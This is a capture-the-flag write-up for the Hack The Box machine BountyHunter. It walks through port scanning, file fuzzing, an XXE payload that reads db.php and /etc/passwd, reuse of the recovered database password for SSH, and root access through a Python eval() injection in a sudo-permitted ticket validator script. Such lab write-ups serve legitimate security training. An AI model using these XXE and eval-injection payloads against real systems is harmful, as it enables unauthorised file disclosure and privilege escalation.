# nmap
````bash
# Nmap 7.91 scan initiated Mon Aug  9 00:42:12 2021 as: nmap -p- -sC -sV --open -oA nmap/10.10.11.100-BountyHunter 10.10.11.100
Nmap scan report for 10.10.11.100
Host is up (0.23s latency).
Not shown: 61080 closed ports, 4453 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug  9 00:43:55 2021 -- 1 IP address (1 host up) scanned in 103.32 seconds
````
- the only path is to enumerate the web

# web

## fuzzing for files

````bash
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -u http://bountyhunter.htb/FUZZ -fs 281
````

![](BountyHunter.HTB-06.png)
- These notes are made after the fact.
- This means the above fuzzing command is one I arrived at to give the prettiest outlook for the screenshot.
- The results yield two files of interest; <span class="myTurquoise"><b>portal.php</b></span> and <span class="myTangerine"><b>db.php</b></span>

<hr>

## link to <span class="myTurquoise">portal.php</span>

![](BountyHunter.HTB-01.png)
- on the landing page, there is a link to portal.php

<hr>

## link to log_submit.php
![](BountyHunter.HTB-02.png)
- on portal.php there is a link to log_submit.php

<hr>

## log_submit.php
![](BountyHunter.HTB-03.png)
- log_submit.php has a form that merely takes form input and merely throws it back on the screen using javascript DOM.

![](BountyHunter.HTB-04.png)

- One can see on Burp how log_submit.php submitting form input to tracker_diRbPr00f314.php
- Form data seems base64 formatted.

![](BountyHunter.HTB-05.png)

````xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>qdadaTitle</title>
		<cwe>qdadaCWE</cwe>
		<cvss>qdadaCVSS Score</cvss>
		<reward>$29.99</reward>
		</bugreport>
````
- one can see how the base64 formatted data is actually and XML data exchange.
- this brings to mind an XXE vulnerability


# user

## xxe vulnerability

````xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
		<bugreport>
		<title>qdadaTitle &xxe;</title>
		<cwe>qdadaCWE</cwe>
		<cvss>qdadaCVSS Score</cvss>
		<reward>$29.99</reward>
		</bugreport>
````
- recall that fuzzing had discovered <span class="myTurquoise"><b>portal.php</b></span> and <span class="myTangerine"><b>db.php</b></span>
- <span class="myTurquoise"><b>portal.php</b></span> had yielded an xml formatted method of data exchange.
- now, that xml is modified to test the vulnerability by reaching for <span class="myTangerine"><b>db.php</b></span> discovered through fuzzing earlier.

## encoding the vulnerability

![](src/BountyHunter.HTB-07.gif)

````bash
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIHJlcGxhY2UgWzwhRU5USVRZIHh4ZSBTWVNURU0gInBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9ZGIucGhwIj4gXT4KICAgICAgICA8YnVncmVwb3J0PgogICAgICAgIDx0aXRsZT5xZGFkYVRpdGxlICZ4eGU7PC90aXRsZT4KICAgICAgICA8Y3dlPnFkYWRhQ1dFPC9jd2U+CiAgICAgICAgPGN2c3M+cWRhZGFDVlNTIFNjb3JlPC9jdnNzPgogICAgICAgIDxyZXdhcmQ+JDI5Ljk5PC9yZXdhcmQ+CiAgICAgICAgPC9idWdyZXBvcnQ+Cgo=
````
- the xxe is encoded into a base64 payload


![](BountyHunter.HTB-08.png)

- the urlencode base64 payload replaces the value for the data parameter
- what returns is the base64 encoded content for <span class="myTangerine"><b>db.php</b></span>

![](BountyHunter.HTB-08.1.png)
````php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
````



![](BountyHunter.HTB-09.png)
- using a similar method, /etc/passwd is fetched to arrive at possible usernames for the discovered credentials
- two accounts have access to bash; <span class="myTurquoise"><b>root</b></span> and <span class="myTangerine"><b>development</b></span>.



![](BountyHunter.HTB-10.png)
- credentials <span class="myYellow"><b>development</b></span>  :  <span class="myYellow"><b>m19RoAU0hP41A1sTsq6K</b></span> are able to logon


# root
## ```sudo -l```


![](BountyHunter.HTB-11.png)

````bash
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
````

- we begin with the obligatory ```sudo -l``` for linux boxes on Hack The Box
- a script  ```/opt/skytrain_inc/ticketValidator.py``` can be run as root

## ```ticketValidator.py```

![](BountyHunter.HTB-12.png)
- ticket is any filename that ends with .md extension
- within the .md file there are lines that must appear in a specific format
- lines 16 to 25 say the .md file should read as follows

````bash
# Skytrain Inc
## Ticket to 
__Ticket Code:__
````


![](BountyHunter.HTB-13.png)
- line 30 - 35 define what the final line should look like. It is also the line where we inject the payload to get root.
- line 32 says the code we are looking for is the code that remains when<br>
[+] first the string ``**``is removed. 
[+] We are left with a <b>code</b> that has plus in it because the split function uses the ``+`` as a separator between two things
- we know that <b>code</b> must be a number because a divisor is applied to it to get a remainder of 4; according to line 33
- The vulnerable ``eval()`` code appears on line 34<br>[+] when the replace function is applied, all that is left is the ticket code and a plus sign
[+] all that remains is the injection of python code so that the code being executed is ``eval(109+__import__('os').system('sudo bash'))``

![](BountyHunter.HTB-14.gif)